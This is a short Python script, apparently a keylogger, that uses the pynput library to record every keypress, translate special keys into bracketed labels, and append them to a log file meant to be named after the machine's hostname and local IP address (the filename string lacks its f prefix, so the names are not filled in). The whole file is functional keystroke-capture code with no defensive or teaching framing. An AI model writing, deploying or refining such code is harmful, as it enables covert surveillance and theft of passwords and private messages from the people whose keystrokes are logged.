from pynput.keyboard import Key, Listener
import socket

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

def functionPerKey(key):
    special_keys = {
        Key.shift: "[Shift]",
        Key.alt: "[Alt]",
        Key.ctrl: "[Ctrl]",
        Key.cmd: "[Windows]",
        Key.enter: "\n",
        Key.backspace: "[Backspace]",
        Key.space: " ",
        Key.tab: "\t",
        Key.esc: "[Esc]",
        Key.up: "[Up]",
        Key.down: "[Down]",
        Key.left: "[Left]",
        Key.right: "[Right]",
        Key.home: "[Home]",
        Key.end: "[End]",
        Key.page_up: "[PageUp]",
        Key.page_down: "[PageDown]",
        Key.insert: "[Insert]",
        Key.delete: "[Delete]",
        Key.f1: "[F1]",
        Key.f2: "[F2]",
        Key.f3: "[F3]",
        Key.f4: "[F4]",
        Key.f5: "[F5]",
        Key.f6: "[F6]",
        Key.f7: "[F7]",
        Key.f8: "[F8]",
        Key.f9: "[F9]",
        Key.f10: "[F10]",
        Key.f11: "[F11]",
        Key.f12: "[F12]",
        # Add more special keys as needed
    }

    if hasattr(key, 'char') and key.char is not None:
        # Normal alphanumeric key
        with open('{hostname}_{local_ip}.txt', 'a') as log:
            log.write(key.char)
    elif key in special_keys:
        # Special keys
        with open('{hostname}_{local_ip}.txt', 'a') as log:
            log.write(special_keys[key])
    else:
        # Other special characters
        with open('{hostname}_{local_ip}.txt', 'a') as log:
            log.write("(" + str(key) + ")")

def onEachKeyRelease(key):
    if key == Key.esc:
        return False

with Listener(
        on_press=functionPerKey,
        on_release=onEachKeyRelease
) as the_listener:
    the_listener.join()
